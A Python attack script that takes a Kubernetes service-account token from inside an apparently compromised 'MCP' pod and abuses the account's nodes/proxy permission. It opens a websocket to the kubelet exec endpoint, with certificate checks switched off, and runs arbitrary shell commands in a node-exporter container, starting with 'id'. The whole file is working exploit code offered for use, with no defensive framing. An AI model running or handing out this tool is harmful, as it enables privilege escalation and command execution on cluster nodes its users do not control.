#!/usr/bin/env python3
"""Kubelet exec via SA token (mcp-sa nodes/proxy). Run inside MCP pod or with TOKEN env/file."""
import asyncio
import os
import ssl
import sys

import websockets

NODE = os.environ.get("KUBE_NODE", "fireflow")
NE_NS = os.environ.get("NE_NS", "monitoring")
NE_POD = os.environ.get("NE_POD", "prometheus-prometheus-node-exporter-nmntq")
NE_CNT = os.environ.get("NE_CNT", "node-exporter")
TOKEN_PATH = os.environ.get("TOKEN_PATH", "/var/run/secrets/kubernetes.io/serviceaccount/token")


def get_token() -> str:
    if os.environ.get("TOKEN"):
        return os.environ["TOKEN"].strip()
    with open(TOKEN_PATH) as f:
        return f.read().strip()


async def ws_exec(cmd_parts: list[str]) -> str:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    args = "&".join(f"command={part}" for part in cmd_parts)
    # k3s/kubelet often expects output/error, not stdout/stderr
    url = (
        f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"
        f"?output=1&error=1&{args}"
    )
    out = []
    async with websockets.connect(
        url,
        ssl=ctx,
        additional_headers={"Authorization": f"Bearer {get_token()}"},
        subprotocols=["v4.channel.k8s.io"],
        open_timeout=15,
    ) as ws:
        try:
            while True:
                data = await asyncio.wait_for(ws.recv(), timeout=8)
                if isinstance(data, bytes) and len(data) > 1:
                    ch, payload = data[0], data[1:]
                    if ch in (1, 2):
                        out.append(payload.decode(errors="replace"))
                elif isinstance(data, str):
                    out.append(data)
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
            pass
    return "".join(out)


def main():
    if len(sys.argv) < 2:
        cmd = ["id"]
    elif len(sys.argv) == 2 and " " not in sys.argv[1]:
        cmd = [sys.argv[1]]
    else:
        cmd = ["/bin/sh", "-c", " ".join(sys.argv[1:])]
    print(asyncio.run(ws_exec(cmd)), end="")


if __name__ == "__main__":
    main()